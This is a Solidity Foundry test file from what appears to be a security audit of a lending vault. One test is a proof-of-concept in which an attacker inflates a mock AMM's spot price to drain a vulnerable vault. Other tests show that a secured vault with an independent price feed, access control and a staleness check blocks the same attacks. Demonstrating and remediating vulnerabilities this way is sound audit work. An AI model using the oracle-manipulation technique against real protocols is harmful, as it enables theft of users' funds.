// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {LendingVaultVulnerable, ISpotPriceSource} from "../contracts/LendingVaultVulnerable.sol";
import {LendingVaultSecured} from "../contracts/LendingVaultSecured.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {MockAMM} from "../contracts/mocks/MockAMM.sol";
import {MockV3Aggregator} from "../contracts/mocks/MockV3Aggregator.sol";
import {AggregatorV3Interface} from "../contracts/interfaces/AggregatorV3Interface.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/// @notice Proves C-01 (oracle manipulation) is exploitable on the vulnerable vault and
///         remediated on the secured vault, plus H-01 (access control) and the staleness check.
contract LendingVaultTest is Test {
    MockERC20 weth; // collateral
    MockERC20 usd; // borrowable stable asset

    MockAMM amm; // manipulable spot "oracle" used by the vulnerable vault
    MockV3Aggregator feed; // independent price feed used by the secured vault

    LendingVaultVulnerable vulnVault;
    LendingVaultSecured secVault;

    address attacker = makeAddr("attacker");

    uint256 constant FAIR_PRICE = 2000; // 1 WETH = 2000 USD
    uint256 constant VAULT_LIQUIDITY = 20_000e18; // USD available to borrow

    function setUp() public {
        vm.warp(1_000_000); // move off timestamp 0 so staleness math is meaningful

        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        usd = new MockERC20("USD Stable", "USD", 18);

        // AMM pool priced so getPrice() == 2000e18 (stable per collateral).
        // reserveStable / reserveCollateral = 2000.
        amm = new MockAMM(1_000e18, 2_000_000e18);
        assertEq(amm.getPrice(), FAIR_PRICE * 1e18);

        // Chainlink-style feed: 8 decimals, 2000.00000000 USD.
        feed = new MockV3Aggregator(8, int256(FAIR_PRICE * 1e8));

        vulnVault = new LendingVaultVulnerable(IERC20(address(weth)), IERC20(address(usd)), ISpotPriceSource(address(amm)));
        secVault = new LendingVaultSecured(IERC20(address(weth)), IERC20(address(usd)), AggregatorV3Interface(address(feed)));

        // Seed both vaults with USD liquidity for borrowers.
        usd.mint(address(vulnVault), VAULT_LIQUIDITY);
        usd.mint(address(secVault), VAULT_LIQUIDITY);

        // Attacker funded with collateral for each scenario.
        weth.mint(attacker, 2e18);
        vm.startPrank(attacker);
        weth.approve(address(vulnVault), type(uint256).max);
        weth.approve(address(secVault), type(uint256).max);
        vm.stopPrank();
    }

    // --------------------------------------------------------------------------------------
    // C-01: Oracle manipulation drains the VULNERABLE vault
    // --------------------------------------------------------------------------------------
    function test_C01_OracleManipulation_DrainsVulnerableVault() public {
        // Fair borrow power for 1 WETH at 50% factor = 2000 * 50% = 1000 USD.
        uint256 fairMaxBorrow = 1000e18;

        vm.startPrank(attacker);
        vulnVault.deposit(1e18); // deposit 1 WETH (true value: 2000 USD)

        // Simulate a flash loan: shove a large amount of USD into the AMM, which spikes the
        // collateral's spot price. (No real funds needed — the vault only reads getPrice().)
        amm.swapStableForCollateral(8_000_000e18);
        uint256 manipulatedPrice = amm.getPrice();
        assertGt(manipulatedPrice, FAIR_PRICE * 1e18 * 10); // price inflated >10x

        // Borrow far beyond fair value and walk away with the vault's liquidity.
        vulnVault.borrow(VAULT_LIQUIDITY);
        vm.stopPrank();

        uint256 stolen = usd.balanceOf(attacker);
        assertEq(stolen, VAULT_LIQUIDITY); // got the entire 20,000 USD
        assertGt(stolen, fairMaxBorrow * 10); // 20x the legitimate borrow limit
        assertEq(usd.balanceOf(address(vulnVault)), 0); // vault drained

        emit log_named_decimal_uint("Collateral deposited (USD value)", 2000e18, 18);
        emit log_named_decimal_uint("Fair borrow limit", fairMaxBorrow, 18);
        emit log_named_decimal_uint("Actually borrowed (stolen)", stolen, 18);
    }

    // --------------------------------------------------------------------------------------
    // C-01 remediated: the SECURED vault ignores the manipulated AMM and caps borrow at fair value
    // --------------------------------------------------------------------------------------
    function test_C01_Remediated_SecuredVaultResistsManipulation() public {
        vm.startPrank(attacker);
        secVault.deposit(1e18);

        // Attacker manipulates the AMM exactly as before...
        amm.swapStableForCollateral(8_000_000e18);

        // ...but the secured vault prices collateral from the independent feed (still 2000 USD),
        // so an over-borrow is rejected.
        vm.expectRevert(bytes("undercollateralized"));
        secVault.borrow(VAULT_LIQUIDITY);

        // The legitimate amount (1000 USD) still works.
        secVault.borrow(1000e18);
        vm.stopPrank();

        assertEq(usd.balanceOf(attacker), 1000e18);
        assertEq(usd.balanceOf(address(secVault)), VAULT_LIQUIDITY - 1000e18);
    }

    // --------------------------------------------------------------------------------------
    // H-01: missing access control on the vulnerable vault; enforced on the secured vault
    // --------------------------------------------------------------------------------------
    function test_H01_AccessControl() public {
        // Vulnerable: anyone can rewrite protocol risk parameters.
        vm.prank(attacker);
        vulnVault.setCollateralFactor(100);
        assertEq(vulnVault.collateralFactor(), 100);

        // Secured: non-owner is rejected.
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, attacker));
        secVault.setCollateralFactor(80);

        // Secured: even the owner cannot exceed the hard cap.
        vm.expectRevert(bytes("factor too high"));
        secVault.setCollateralFactor(91);

        // Owner within bounds succeeds.
        secVault.setCollateralFactor(80);
        assertEq(secVault.collateralFactor(), 80);
    }

    // --------------------------------------------------------------------------------------
    // Secured vault rejects a stale price feed instead of trading on bad data
    // --------------------------------------------------------------------------------------
    function test_Secured_RejectsStalePrice() public {
        vm.startPrank(attacker);
        secVault.deposit(1e18);

        // Age the feed beyond the 1-hour staleness threshold.
        feed.setStale(block.timestamp - 2 hours);
        vm.expectRevert(bytes("stale price"));
        secVault.borrow(100e18);
        vm.stopPrank();
    }

    // --------------------------------------------------------------------------------------
    // Happy path sanity check on the secured vault
    // --------------------------------------------------------------------------------------
    function test_Secured_HappyPathBorrowAndRepay() public {
        vm.startPrank(attacker);
        secVault.deposit(1e18);
        secVault.borrow(900e18); // under the 1000 USD limit
        assertEq(usd.balanceOf(attacker), 900e18);

        usd.approve(address(secVault), type(uint256).max);
        secVault.repay(900e18);
        assertEq(secVault.debtOf(attacker), 0);
        vm.stopPrank();
    }
}
